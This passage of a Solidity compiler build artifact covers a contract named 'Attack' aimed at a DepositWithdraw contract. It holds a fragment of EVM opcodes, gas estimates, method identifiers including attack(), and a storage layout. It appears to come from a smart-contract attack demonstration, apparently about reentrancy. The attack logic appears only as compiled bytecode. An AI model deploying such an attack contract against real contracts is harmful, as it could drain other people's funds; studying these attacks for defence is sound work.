0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x226 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x23A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x54876921 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2A0 SWAP2 SWAP1 PUSH2 0x32B JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2CE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x2DD DUP2 PUSH2 0x3A6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2EC DUP2 PUSH2 0x3B8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2FB DUP2 PUSH2 0x3CA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x30A DUP2 PUSH2 0x39C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x325 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2D4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x340 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x35B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2F2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x376 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x301 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3B1 DUP3 PUSH2 0x3DC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C3 DUP3 PUSH2 0x39C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3D5 DUP3 PUSH2 0x39C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3E7 DUP3 PUSH2 0x3EE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3F9 DUP3 PUSH2 0x37C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CHAINID 0xAB 0x2D CREATE INVALID 0x22 CODECOPY ADDRESS PUSH29 0x24280527C3ED7C729AD2E1994EB4349256DFBDD04906FB64736F6C6343 STOP ADDMOD SMOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "215600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"depositWithdraw()": "2597",
						"getBalance()": "317"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"depositWithdraw()": "6e0e0da2",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 64,
						"contract": "contracts/Attack.sol:Attack",
						"label": "depositWithdraw",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(DepositWithdraw)61"
					}
				],
				"types": {
					"t_contract(DepositWithdraw)61": {
						"encoding": "inplace",
						"label": "contract DepositWithdraw",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}